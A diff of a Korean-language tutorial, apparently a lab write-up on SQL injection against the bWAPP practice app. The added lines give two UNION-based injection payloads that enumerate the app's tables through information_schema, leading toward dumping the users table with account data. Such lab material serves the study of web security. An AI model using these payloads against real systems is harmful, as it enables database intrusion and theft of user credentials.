@@ -123,7 +123,14 @@ SQL 인젝션 결과 데이터베이스 서버에 존재하는 모든 데이터�
 
 [https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)
 
-출력된 테이블 명 중 users 테이블에 사용자의 계정 정보가 들어있다고 추측할 수 있습니다. users DB의 정보를 출력해봅니다.
+- where 절을 이용해서 필요한 테이블만 별도로 추출<br>
+`' UNION select 1, TABLE_SCHEMA, TABLE_NAME, 4, 5, 6, 7 from information_schema.tables where table_schema = 'bWAPP' # %'`
+
+- 불필요한 정보를 쿼리 실행 결과에 포함되지 않도록 쿼리를 수정<br>
+`' and 1 = 2 UNION select 1, TABLE_SCHEMA, TABLE_NAME, 4, 5, 6, 7 from information_schema.tables where table_schema = 'bWAPP' #` 
+
+
+출력된 테이블 명 중 users 테이블에 사용자의 계정 정보가 들어있다고 추측할 수 있습니다. users table의 정보를 출력해봅니다.
 
 ---
 
